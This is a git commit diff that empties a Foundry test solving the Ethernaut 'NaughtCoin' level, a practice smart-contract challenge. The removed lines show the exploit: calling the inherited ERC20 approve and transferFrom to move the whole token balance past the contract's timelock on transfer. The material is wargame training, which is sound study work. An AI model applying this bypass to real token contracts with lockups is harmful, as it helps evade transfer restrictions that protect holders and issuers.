001e4f6f5c5c65c030d19f14726eb34a48d6c852
Mis4nthr0pic <121455563+Mis4nthr0pic@users.noreply.github.com>
2023-07-07 21:35:41 -0300

    Update NaughtCoin.sol

--- src/test/NaughtCoin.sol
+++ src/test/NaughtCoin.sol
@@ -15,30 +15,6 @@ contract NaughtCoinTest is DSTest {
     }
 
     function testNaughtCoinHack() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-
-        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
-        ethernaut.registerLevel(naughtCoinFactory);
-        vm.startPrank(tx.origin);
-        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
-        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        // Use approve and transferFrom which are inherited from ERC20.sol don't have the timelock modifier
-        ethernautNaughtCoin.approve(tx.origin, (1000000 * (10**uint256(18))));
-        ethernautNaughtCoin.transferFrom(tx.origin, address(100), (1000000 * (10**uint256(18))));
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+  
     }
 }
